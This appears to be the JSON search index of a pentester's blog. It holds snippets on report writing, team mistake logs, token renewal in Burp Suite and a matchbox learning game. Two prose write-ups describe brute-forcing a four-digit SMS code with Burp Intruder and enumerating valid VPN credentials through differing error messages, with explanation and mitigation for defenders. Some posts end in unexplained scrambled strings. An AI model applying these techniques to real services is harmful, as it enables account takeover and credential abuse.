to be a professional pentester. We can also see that all the details sum up to deliver a great final product, one that you‚Äôll be proud of and you‚Äôll know that your client will get the value they were expecting.A great pentest report is the one that speaks for itself, that is, it can communicate effectively with both executive and technical audiences." }, { "title": "Learning from your mistakes as an offensive security professional", "url": "/posts/learning-from-your-mistakes/", "categories": "learning, methodology", "tags": "mistakes, red-team, pentest, infosec", "date": "2020-12-28 00:00:00 +0000", "snippet": "IntroductionIn both my personal and professional lives I try my best to live by a simple¬†statement: ‚ÄúYour failures are the building blocks of your success‚Äù. But having a nice motivational quote means nothing if it stays only on paper (or screen). So, for a while now I had this idea of actually convert its meaning into action and the perfect opportunity had just knocked on my door.You see, last month I began a new professional challenge: to lead a red team. I‚Äôm not diving into what a red team is, but I now have a job where I must technically guide the team while planning and executing our projects and developing ourselves.Very recently me and my team mate Gustavo Viana performed a certain engagement against our company. The action lasted for about half an hour and as soon as it¬†ended, we were approached by our manager: ‚ÄúI was just asked if the Red Team was doing something on our &amp;lt;service name&amp;gt;. Are you?‚ÄùIt was at this moment we knew: we fu‚Ä¶.ed up.On¬†the¬†same¬†day,¬†after¬†all¬†the¬†dust¬†settled, I realized that this particular incident could be the one that would turn this old idea of mine¬†into¬†something¬†actually¬†useful: to be able to register my professional mistakes so I could really make them the building blocks of my professional success.However, now I‚Äôm not just a member of my team. I lead¬†it. So guided by that thought, I saw that I could extend my idea to the whole team and make it a methodology.First things firstBefore I begin to walk you through the process, I have to tell you that all of this is completely useless if you can‚Äôt come forward on your own mistakes. Be humbled by the fact that you‚Äôre human, imperfect in every possible way, and you make mistakes¬†every¬†time. The great thing about being human, though, is that you can learn from not just your own mistakes, but from others.What to register?Well, everything you can think it‚Äôs important to detail exactly what happened, when it happened and why¬†it¬†went¬†wrong. You also want to include every single technical detail about the environment, the technical and business impacts your team‚Äôs mistake created, the consequences generated, negative and positive, and, of course, the lessons learned from the event.Where to register?Personally, I use Joplin for note taking, so I just created a new notebook under my companies main notebook. Each note means one event where mistakes were made. Now, one thing I had in mind is the fact that I‚Äôm not doing that just for me, but for my whole team. So the ideal situation is if or those notes to be available for everyone on the team. My only warning here is that the notes must be stored in a safe place.The note templateBelow you can see the note template I created in Joplin with the help of my colleague:How to fill in the topics?What I recommend for the topics ‚ÄúAction‚Äù, ‚ÄúTechnical details‚Äù, ‚ÄúImpact‚Äù and ‚ÄúConsequences‚Äù is that you gather as much information as possible, so you have them rich in details. This will help to remember the event in the future. Also, involve the team in the process. They can help you to grow the details and even add more information.As for the remaining topics, the most important ones, it‚Äôs highly recommended that you do a brainstorming session with the whole team (not only the members who participated in the event) so all the possible mistakes and lessons can be extracted.The methodologyAs a team leader, I‚Äôd like this methodology to be part of the team‚Äôs day to day, so everyone knows what needs to be done and why. Because of that, I came up with some rules that I think are essential for this to work as intended: All the notes and brainstorming sessions are restricted only to the team. Absolutely no names must be¬†mentioned. The purpose here is not to register who made the mistake, but learn from it. The team leader must ensure that nobody is bullied for making a mistake. As I already said: mistakes are great opportunities for learning and they must be treated this way if you want a more mature team. So it‚Äôs your responsibility as a leader to plant that mindset seed inside the team‚Äôs head. The notes must be securely stored and accessed. This is optional: I recommend that every new member of the team go through all the existing notes, so they can see what the team has already gone through and all the good lessons they‚Äôve learned. It‚Äôs a great way for the newcomers to also learn those lessons, but without having to make the same mistakes.Final thoughtsImagine if every team had a methodology for learning from its own mistakes. Imagine what great lessons are now lost because people think mistakes are ugly and embarrassing things that must be pushed under the carpet.It‚Äôs really great to have a way to register those tense moments and all the mistakes and the lessons taken from them. I hope that with this post I can plant the mindset I so much appreciate into people‚Äôs minds." }, { "title": "Learning from your mistakes as an offensive security professional", "url": "/posts/learning-from-your-mistakes-as-an-offensive-security-professional/", "categories": "infosec, pentest", "tags": "offensive-security, learning", "date": "2020-12-28 00:00:00 +0000", "snippet": " A team methodology for extracting the best lessons out of your worst failures.IntroductionIn both my personal and professional lives I try my best to live by a simple statement: ‚ÄúYour failures are the building blocks of your success‚Äù. But having a nice motivational quote means nothing if it stays only on paper (or screen). So, for a while now I had this idea of actually convert its meaning into action and the perfect opportunity had just knocked on my door.You see, last month I began a new professional challenge: to lead a red team. I‚Äôm not diving into what a red team is, but I now have a job where I must technically guide the team while planning and executing our projects and developing ourselves.Very recently me and my team mate Gustavo Viana performed a certain engagement against our company. The action lasted for about half an hour and as soon as it ended, we were approached by our manager: ‚ÄúI was just asked if the Red Team was doing something on our &amp;lt;service name&amp;gt;. Are you?‚ÄùIt was at this moment we knew: we fu‚Ä¶.ed up.On the same day, after all the dust settled, I realized that this particular incident could be the one that would turn this old idea of mine into something actually useful: to be able to register my professional mistakes so I could really make them the building blocks of my professional success.However, now I‚Äôm not just a member of my team. I lead it. So guided by that thought, I saw that I could extend my idea to the whole team and make it a methodology.First things¬†firstBefore I begin to walk you through the process, I have to tell you that all of this is completely useless if you can‚Äôt come forward on your own mistakes. Be humbled by the fact that you‚Äôre human, imperfect in every possible way, and you make mistakes every time. The great thing about being human, though, is that you can learn from not just your own mistakes, but from others.What to register?Well, everything you can think it‚Äôs important to detail exactly what happened, when it happened and why it went wrong. You also want to include every single technical detail about the environment, the technical and business impacts your team‚Äôs mistake created, the consequences generated, negative and positive, and, of course, the lessons learned from the event.Where to register?Personally, I use Joplin for note taking, so I just created a new notebook under my companies main notebook. Each note means one event where mistakes were made. Now, one thing I had in mind is the fact that I‚Äôm not doing that just for me, but for my whole team. So the ideal situation is if or those notes to be available for everyone on the team. My only warning here is that the notes must be stored in a safe place.The note¬†templateBelow you can see the note template I created in Joplin with the help of my colleague:How to fill in the¬†topics?What I recommend for the topics ‚ÄúAction‚Äù, ‚ÄúTechnical details‚Äù, ‚ÄúImpact‚Äù and ‚ÄúConsequences‚Äù is that you gather as much information as possible, so you have them rich in details. This will help to remember the event in the future. Also, involve the team in the process. They can help you to grow the details and even add more information.As for the remaining topics, the most important ones, it‚Äôs highly recommended that you do a brainstorming session with the whole team (not only the members who participated in the event) so all the possible mistakes and lessons can be extracted.The methodologyAs a team leader, I‚Äôd like this methodology to be part of the team‚Äôs day to day, so everyone knows what needs to be done and why. Because of that, I came up with some rules that I think are essential for this to work as intended: All the notes and brainstorming sessions are restricted only to the team. Absolutely no names must be mentioned. The purpose here is not to register who made the mistake, but learn from it. The team leader must ensure that nobody is bullied for making a mistake. As I already said: mistakes are great opportunities for learning and they must be treated this way if you want a more mature team. So it‚Äôs your responsibility as a leader to plant that mindset seed inside the team‚Äôs head. The notes must be securely stored and accessed. This is optional: I recommend that every new member of the team go through all the existing notes, so they can see what the team has already gone through and all the good lessons they‚Äôve learned. It‚Äôs a great way for the newcomers to also learn those lessons, but without having to make the same mistakes.Final thoughtsImagine if every team had a methodology for learning from its own mistakes. Imagine what great lessons are now lost because people think mistakes are ugly and embarrassing things that must be pushed under the carpet.It‚Äôs really great to have a way to register those tense moments and all the mistakes and the lessons taken from them. I hope that with this post I can plant the mindset I so much appreciate into people‚Äôs minds." }, { "title": "Handling Short Expiration Time of Authorization Tokens", "url": "/posts/handling-short-expiration-time-of-authorization-tokens/", "categories": "Infosec, Pentest", "tags": "web, burp-suite, authorization", "date": "2020-12-22 00:00:00 +0000", "snippet": " How not to waste precious time when testing a web applications or API‚Äôs with Burp¬†SuiteIntroductionIn my few years doing web/API pentesting, it was the first time I had to think about how to automate the process of renewing an authorization token during the process of bruteforcing with Burp‚Äôs Intruder and when using Burp‚Äôs Repeater so I din‚Äôt have to do it manually every ten minutes, which was the expire time for the token in this scenario.Well, since I haven‚Äôt seen any blog posts on this specific scenario, I‚Äôve decided to write one myself. Perhaps it can help folks out there struggling just like I was recently.I was actually doing a pentest on an API and it had two main endpoints: one for getting a new authorization token and the other to request some data using this token. Below you can see both requests to these endpoints:The ProblemAs you can see in the first image above, we have a very small window for interacting with the API before we need another token because of the property ‚Äúexpires_in‚Äù in the response body. As a matter of fact, when I tried to run Intruder for longer than ten minutes, I started to get status code 401 (unauthorized). Unfortunately when I was testing the API I didn‚Äôt have any intention of writing a blog post about this, so once I figured it out, I simply ran the attack again and all of the requests resulting in 401‚Äôs were reissued. No prints here, sorry‚Ä¶The First Part of the¬†SolutionMoving on, once I realized that I had to deal with this short time frame before having to request a new token, I began to do what every good penetration tester does: begging on my knees for google to bring me a solution. Jokes apart, I knew that Burp had something for handling sessions, but I had never used it before, nor I knew where those options were. Even so, It wasn‚Äôt dificult to find them:As we can see, the descriptions are self explanatory: session handling rules define¬†, well, rules. They‚Äôre applied every time a request within the scope for that rule is being issued. Let‚Äôs detail this area a bit more:Session Handling RulesThis session lets you create rules with predefined scope and they will be executed before every request that is in the same scope. It can be used to check the validity of a session, add cookies to the request, perform login. It‚Äôs important to note that all the rules are applied in the same order they are listed, respecting their scopes, that is, if a rule isn‚Äôt in the scope of a certain request, it will not be applied to that specific request.MacrosQuoting the very well put description: A macro is a sequence of one or more (HTTP) requests. You can use macros within session handling rules to perform tasks such as logging in to the application, obtaining anti-CSRF tokens, etc.Building the session handling ruleKnowing how these two resources work, we can now start building a session rule and a macro to renew our access token. First let‚Äôs add a new rule:In the image above we can se an area for a brief description and also what actions it will perform once it‚Äôs called. Thare‚Äôs also the scope tab, as seen below:This tab let‚Äôs you choose in what parts of Burp Suite this rule will be used, to what URL‚Äôs they can be applied, as well as restricting the rule only to requests containing custom parameters.Adding a Rule ActionOnce we defined the rule scope, let‚Äôs add an action to be performed when this rule is executed. We named the action ‚ÄúCheck session is valid‚Äù and here is where things start to get real:Let‚Äôs break the action editor in two parts:Rule action editor: first part First the action needs to make an HTTP request as the first step to validate the session. Here I said that I want to issue the same request that is being validated, but I could also run a macro (let‚Äôs see macros in a bit) to do the same thing if it was the case. How often in terms of requests Burp will perform the session validation. In the image, we can see every 10 requests, which for this scenario is unecessary, but let‚Äôs keep this way anyway. Where to inspect the response to check if the session is valid. Here we can see ‚ÄúHTTP headers‚Äù, ‚ÄúResponse body‚Äù (our case) and ‚ÄúURL of redirection target‚Äù. What to look when inspecting the response. In my case I had to look for the literal string ‚Äú401‚Äù in the response body as this was the bahaviour i got when the token expired. Note that we can also look for regex and make the search case (in)sensitive. Lastly, for this first part, we have to indicate if a match means that the session is still valid or if it‚Äôs invalid. In my case, the literal string ‚Äú401‚Äù means that the session is invalid.Rule action editor: second partThis second part is broken down in two: What happens if the session is valid/invalid: If it is valid, no other rules or actions are processed for this request. If it is invalid, I chose to run a macro, which we‚Äôll see next. For the last part, we can update the request with parameters matched from the final macro response and/or update the request with cookies from session handling cookie jar.The Second Part of the¬†SolutionNow, note the last checkbox in the image above. I can, after running the macro, invoke a Burp Extension action handler. What id does is pass the macro‚Äôs requests to the extension and it will do something with them.Now, can you tell me why I need an extension to be called in the first place if I have a whole system for handling sessions? Well, if you look closely, none of the requests actually have sessions because they don‚Äôt use session cookies to handle authorization. All we have is the header Authorization: Bearer with a big base64 after it, which is the actual token.So, after all this trip we can see that Burp does not have (at least not yet) a built-in process for handling this type of need: I need the contents of a header from the request to be replaced with part of the contents of the macro‚Äôs response. Good thing that Burp has this amazing capability of integrating extensions to fill in those gaps.So for this specific need, there‚Äôs this Burp extension called ‚ÄúCustom Parameter Handler‚Äù or CPH. What it does is ‚Äúmodifying HTTP messages with surgical precision, even when using macros‚Äù. More precisely for my scenario, it allows, among other things, search and replace inside requests and responses.But before we dive into the configurations of the extension, we have to see what the heck this macro thing does, because we‚Äôre going to need this knowledge soon.Configuring a macroIn the image above we can see the main window for recording and configuring a macro. As I said earlier, a macro is a group of requests that are issued in order. Also, we can pass parts of the response from a request to the next one until we have one final HTTP response. In my case, all of the requests listed here will be passed to the CPH extension.First we have to record the macro, that is, select from the proxy HTTP history tab all the requests we want to be part of the macro. In my case, it‚Äôs only the one that generates a new access token:We could, if we wanted, configure each macro request to get all the needed parameters from the responses and pass them to the next request:Although I‚Äôm not going too deep in this part, this window lets you add and use cookies from each response to the session handling cookie jar so they can be used in the next request. Also, we can specify parameters with a lot of precision. Burp will get the parameters configured here and pass them to the next request of the macro.So, now you can see that we don‚Äôt have any options for replacing header values from the macro‚Äôs response into our actual requests. That‚Äôs why we need to use the CPH extension. Let‚Äôs finally see the magic:Configuring CPH extensionLet‚Äôs break this explanation into three parts. This first will handle CPH options: The CPH tab will appear once you install the extension. In it we can see the options tab. There we can save/load or import/export a configuration and we can also set the Burp tools that the extension will work with.The second part deals with the creation of tabs:Once you selected ‚ÄúAfter running the macro, invoke a Burp extension action handler‚Äù checkbox in the last part of the Session handling action editor, a CPH tab is automatically created to handle the request of the macro. The first part of the tab let‚Äôs me name it and set the scope of use inside the URL‚Äôs that are in Burp‚Äôs scope.The third part is the magic: Here we setup a regex for searching the string to be replaced in the original request. Notice that the regex starts with ‚Äúey‚Äù. It will match exactly the access token (a JWT) that expired. The first string found by the regex in (1) will be replaced by the contents of a second regex. In this case, ‚Äú\\g‚Äù refers to a named regex group called ‚Äújwt‚Äù, which we‚Äôll see in (4). If I check the ‚ÄúThe value I need is dynamic‚Äù box, option number four becomes available. We want to use it because every time we issue the request, a new token is generated. Finally, when the macro request is issued, this regex search is performed to extract the newly received access token. Note that I start the regex with _(?P_‚Ä¶ Here I‚Äôm naming the regex group defined by the pair of parenthesis, which in this case match the whole token.So, the value extracted from the response by the regex (4) search is used to replace the old access token (option 2). This way I can even issue a request to the main endpoint of the API with an invalid JWT and the request will still work because in the background this extension will be working its magic.ConclusionThe conclusion here is that Burp Suite is way more powerfull than you and I can imagine. And I don‚Äôt even use its full power. And just to be clear, this post is not sponsored by PortSwigger in any way. I‚Äôm just stating a fact. They are doing a really good job with this tool." }, { "title": "Bypassing Phone Number Verification", "url": "/posts/bypassing-mobile-phone-number-verification/", "categories": "Infosec, Pentest, Web", "tags": "pentest, web", "date": "2019-04-24 12:00:00 +0000", "snippet": " In this post I‚Äôll show you how I bypassed the phone number verification process in a website. I‚Äôm also going to explain why this was possible and what we can do to prevent this type of vulnerability.What is phone number verificationWhen you create an account in some website, sometimes they ask you to verify the phone number that you inform in the registration process. They send a SMS to the number you provided and ask you to type the code that came in that message. This way, they know that the number you informed is really yours. Doing that means that your account is now linked with an official mobile phone number, which is linked to your name. This is a form of identity verification.Why do they ask for a mobile number verificationThese verification processes allow the websites to link the accounts to real people. They do so because they want to prevent mass account creation by bots. This also helps to keep hackers from doing bad things using those accounts, because if they do, their mobile numbers are attached to their accounts, making it easier to identify them.The wrong way to implement mobile number verificationTo implement such security measure, we first have to know what are the best practices and also what are the types of attacks possible for this kind of scenario.Today it‚Äôs not difficult to find free tools that automate various types of attacks against number verification processes. Based on that, we have to keep in mind for example how many digits the codes sent via SMS must have. Today, most online banking applications use seven or eight digit codes to login to the website and even to authorize transactions.Using a four digit code today, for example, is not a secure way to verify a phone number, as we‚Äôll see in this post. This is due to the fact that there are countless tools on the internet able to bruteforce ten thousand numbers (the number of four digit codes, from 0000 to 9999).Another thing that websites have to keep in mind is the number of wrong tries when a person submits a code. What I mean is that we have to make sure the website does not allow bruteforcing the code. This can be prevented by puting some kind of limitation when a person enters a code. One way to do that is to force the user to send a new code and invalidate the previous after a small number of wrong tries.The PoCI was creating a new account for me on a website and when I went to the account settings area, I saw that they ask to verify my phone number. I followed the process and they sent a SMS to my phone, wihch I received in just a few seconds. The code was 2161, just four digits. When I saw that, I though ‚Äúwell, lets verify my number AND make a poc‚Äù. The first thing that I did was to boot up my Kali and fire up Burp Suite. Burp is a tool to perform security assessments on web applications. It‚Äôs a robust tool and even in its free version, a lot can be done.Burp acts like a proxy, it stands between your browser and the web server. Doing that allows you to see all the requests that your browser generates and also the web server responses, all that before the requests/responses get to their destinations. You can also modify those requests/responses to trick the web server and sometimes bypass some security implementations.So, I used those funcions that burp provides to see how the request generated by the application after we type the code we received on the website looks like.As we can see in the image above, the last line of the request carries the number ‚Äú0000‚Äù, which was the number I typed on the website in order to force it to generate and send the request to the server. The thing is that the request never got to the web server because burp was able to capture it first.The bruteforce processKnowing how the request is formed, now we can make burp send thousands of requests that look just like the original one, but with the difference that the verification code will be unique for each request. The server will receive the packages and process them, looking for the verification codes and comparing them with the correct one. If one code is wrong, the web server answers that request with an error message, and if the code is correct, it validates the phone number.To bruteforce the code, we‚Äôll use the burp‚Äôs Intruder tab. It allows us to mark specific parts of the request to be bruteforced. The attack method we‚Äôll use is the Sniper, which is the simplest method.The payload tab of the intruder allows us to generate a list of numbers that will be used in the attack. Each number will be put in a single request, replacing the ‚Äú0000‚Äù from the original one.In the list, I chose to go from 2000 to 3000 because I already know the right code, which is 2161. This means that we only have to send 162 requests to get to the correct code. But in a real attack, burp would send 10000 requests, each one carrying one code from 0000 to 9999.When we start the attack, we can see that burp starts to send the fake requests to the server, each one with its own code.And we can also see the response from the web server, which returns an error message:So, after a while, burp sends the correct code to the server and we can see that the response is now different, a confirmation that the code works.‚ÄúYour mobile number has been validated.‚Äù So we know that the server accepted my request with the right code. Going to the webpage I can see that my number is now green, meaning that it‚Äôs validated.Well, that‚Äôs it. I‚Äôll try to contact the people responsible for the website security to inform them of my findings. I hope I was able to explain the process and the concepts behind it in an easy way. See you next time!UOLAYFIRERTRUAESBEILHIDUBGSCNOKLYFUROUSOECYACSSSTUSNOIKHOYLHOSAUEBMLOEC" }, { "title": "A Matchbox Machine that Learns", "url": "/posts/matchbox-machine-that-learns/", "categories": "Machine Learning", "tags": "machine-learning, python", "date": "2019-04-24 12:00:00 +0000", "snippet": " Hey you! So, here I am with my first post of 2019. And here, I‚Äôm going to write about a very cool thing that I learned a few weeks ago.But first the background storyI‚Äôm taking an interest in how machine learning systems work and mostly how I can apply them to data science problems. Digging up the internet on the fundamentals, I‚Äôve found a very cool publication from 1962 where professor Martin Gardner explains how to build a machine out of matchboxes (that‚Äôs right, matchboxes) that can learn how to play a game from scratch and even master it.The process is actually very clever and it‚Äôs an adaptation of a previous experiment where a guy builds a machine with more than 300 matchboxes to play tic-tac-toe to perfection.What I didIn short, I‚Äôve written a python code that mimics Prof. Gardner‚Äôs experiment, just like as if I was using real matchboxes. I‚Äôm taking a more technical approach here, which means that I am teaching a computer how to play and master a game.The gameThe game used to teach the machine is actually a much simpler version of chess. It‚Äôs called Hexapawn and it‚Äôs played on a 3 by 3 board of black and white squares and a total of six pawns, three for each player. They are placed on the first and last rows of the board. The moviments of the pieces are just like those of the pawns on a standard chess game: they move only forward one square at a time and they can also capture an opponent piece if it stands on one of the two diagonal squares of the next row. The exceptions are that in Hexapawn there‚Äôs no en passant move and there are no two square moves for their first movement. Also, there‚Äôs no pawn promotion.To win a game, a player must be in one of the following situations:1 - The player was able to capture all of the opponent‚Äôs pawns;2 - The player was able to move one of its pawns to the last row of the board relative to him; or3 - The player was able to make a move that leaves the opponent with no legal movement for his next move.Based on this, we now know all the information needed to play the game.How the machine learns the game? Positive and negative reinforcementsThis is the interesting part. How to make a mechanical system out of matchboxes that mimics a learning style? And how to simulate this system in a python code?First thing to explain here is the matchboxes system. According the Prof. Gardner‚Äôs publication, we need 24 matchboxes to simulate a learning computer. Each little box will represent a board state, and by that I mean every possible board configuration that the non-human player can find during a single game.So, in this system, we can draw little 3 by 3 boards on one of the faces of the matchboxes, along with the pieces of that specific board position. Also, we have to represent every single possible move that the machine can make if it is presented with this board configuration. We can use arrows for this, and each arrow must be colored with a unique color to differentiate it from the others. The reason for this is that inside each matchbox we have to put little things that also represent a specific move the machine can make, and each thing has to have the same colors as the arrows. Those ‚Äúthings‚Äù I‚Äôm talking about can be anything: little balls, little pieces of paper, whatever.So, after the human player makes his move, we have to pay attention to the current board state and look for the matchbox that matches that state. Once we find the right one, we shake it and take out one of the things inside, without seeing. From that we make the move corresponding to the color of the chosen thing.This repeats until the human or the machine wins the game. And here‚Äôs where the learning begins: If the machine loses the game, we have to apply negative reinforcement, which means that we will remove the thing used to make the machine‚Äôs last move, which was the one that led the its defeat. This is very important because this way we are ‚Äúteaching‚Äù the machine that this specific move is bad for that specific board configuration, because we know that it leads to defeat, and thus, the machine must not play the move again if it finds itself on the same board state on future games. See what we‚Äôre doing here? We are removing all the moves that lead to defeat, so in time the machine will have only moves that doesn‚Äôt make it lose.Now, what if the machine wins a game? If this is the case, we have two different approaches. One of them maks the learning process go faster, causing the machine to master the game in fewer games played. The other one uses probability to mimic the machine‚Äôs future moves. Let‚Äôs see how they work:On the first case, if the machine wins the game, we simply take all of the things from the matchbox where the winning move was made, but the winning thing. This is because we can garantee that if the game reaches this specific board state, then there‚Äôs a move that wins the game always, so the machine doesn‚Äôt need the other ones, which means that every time that the game reaches this configuration on the board, the machine has only the winning move to make. In a short amount of games, the machine can narrow almost all of the existent moves inside the matchboxes to only those that lead to victory.For the second case, instead of removing things, we‚Äôre adding. But we‚Äôre going to add a thing that has the same color of the thing representing the winning move of the last game. This way we are increasing the probability that the machine will choose that move again in future games, despite of the fact that it will still be able to make the wrong moves even having a winning move available. This learning process is called positive reinforcement, because we are adding something to the system.The Python codeWhen I read about this machine learning game, the first thing that came to my mind was that I wanted to implement this in Python and put it in a Telegram bot. So here is the code and here is the Telegram bot. To represent the matchboxes I used a python dictionary. I came up with a system to represent the board states and the moves with numbers, and for each of the machine‚Äôs losses, I can remove the moves that cause the loss as well as all of the other moves in the case of winning (I opted not to go with the probability approach. Also, keep in mind that this choice is a negative reinforcement. I‚Äôm removing items from the system that will cause the machine to ‚Äúlearn‚Äù and apply this learning next time it bumps into the same situation).ConclusionWell, that‚Äôs it. This was a really fun project to make. I learned so much about the fundamentals of machine learning, and I value the fundamentals a lot! One last thing: if you found an error of any kind or just have a sugestion of improvement for this article or the python code, dont hesitate in contact me at ulisses.alves@protonmail.com. I‚Äôll be more than happy to get a feedback from you!\\x07\\x44\\x42\\x01\\x59\\x13\\x44" }, { "title": "Credentials validation without PoC", "url": "/posts/credentials-validation/", "categories": "Infosec, Web", "tags": "infosec, web, pentest", "date": "2018-04-20 00:00:00 +0000", "snippet": " I‚Äôve found a flaw in one of the Check Point appliances. Because I want to register a CVE, I‚Äôm required to have a public PoC explaining the vuln. So, here it is‚Ä¶What I discovered?Basicaly I found a way to validate credentials in the login page of the Check Point VPN appliance. By validate I mean that I can know whether a pair username:password is valid or not inside the web application without the need of authentication.How I discovered it?I was doing a pentest in a public organization in my country and I decided to do some manual enumeration in the login page of the VPN appliance. First I saw that the webapp displays an error message (Access denied - wrong user name or password) when I tried to input some random credentials:So far nothing wrong. Things started to bother me when I used some credentials I got in a phishing campaign in the login page and the webapp showed me a different message (User is unauthorized):I wasn‚Äôt able to login into the webapp, but I got a different error message than before‚Ä¶ This is at least a weird behavior. So based on this, I tried some combinations: wrong_username:valid_password, valid_username:invalid_password, invalid_username:invalid_password. In all of these attempts I got the first error message. Only when I used a credential from the ones I got from the phishing campaign I was able to receive the second message. So, based on this, I concluded that those credentials must exist somewhere inside the appliance, in a database, but the user isn‚Äôt allowed to login.Okay, but how can a bad guy take advantage of it?That‚Äôs the simple part. Really. If an attacker is targeting a company that uses this appliance, he can build a social engineering campaign to gather as much information as possible about all of the employees and he can also create a custom wordlist using these information in order to attempt an online dictionary attack in the login page. This way he can separate all of the credentials that produce the second error message. These credentials can then be used in further attacks. In my case, I could use those credentials to gain access to the user‚Äôs webmail.ConclusionWell, that‚Äôs it. I hope I made myself clear about this Poc. I‚Äôll update this post when my request for a CVE is answered.\\x07\\x44\\x42\\x01\\x59\\x13\\x44" } ]
